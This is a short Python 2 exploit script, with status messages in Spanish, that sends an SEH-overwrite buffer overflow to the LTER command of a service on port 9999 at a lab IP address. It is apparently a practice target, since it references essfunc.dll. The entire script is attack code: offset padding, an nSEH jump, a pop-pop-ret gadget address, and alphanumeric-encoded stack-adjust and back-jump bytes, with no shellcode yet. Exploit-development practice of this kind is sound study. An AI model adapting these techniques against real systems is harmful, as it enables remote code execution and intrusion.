#!/usr/bin/python

import sys
import socket
import random
import string
import struct

def pwned(_host, _port, _payload):
    print "[*] Conectandose a {0}:{1}...".format(_host, _port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((_host, _port))
    print "[*] Conectado, Enviando payload {0} bytes...".format(len(_payload))
    _payload = "{0}\r\n\r\n".format(_payload, _host)
    print _payload
    s.send(_payload)
    s.close
    print "[+] Payload de {0} bytes Enviado.".format(len(_payload))

def main():
  _host = "192.168.236.159"
  _port = 9999
  _offset_eip = 3518
  _nseh = struct.pack("<L",0x90900674) 
  _seh  = struct.pack("<L",0x6250160A) #625011BF pop ebx # pop ebx # retn essfunc.dll
  _espAdj = "\x54\x58\x66\x05\x25\x14\x50\x5C" #0x13a6
  _backJump1 = ""
  _backJump1 += "\x25\x4A\x4D\x4E\x55"
  _backJump1 += "\x25\x35\x32\x31\x2A"
  _backJump1 += "\x05\x76\x40\x50\x50"
  _backJump1 += "\x05\x75\x40\x40\x40"
  _backJump1 += "\x50"
  _espAdj2 = "\x54\x58\x2c\x34\x50\x5c"
  _break = 4000
  
  _inject = "LTER ."
  _inject += "A" * 3472
  _inject += _espAdj2
  _inject += "A" * (_offset_eip - 3472 - len(_espAdj2))
  _inject += _nseh
  _inject += _seh
  _inject += _espAdj
  _inject += _backJump1
  _inject += "D" * (_break - len(_inject))

  pwned(_host,_port,_inject)

if __name__ == "__main__":
	main()
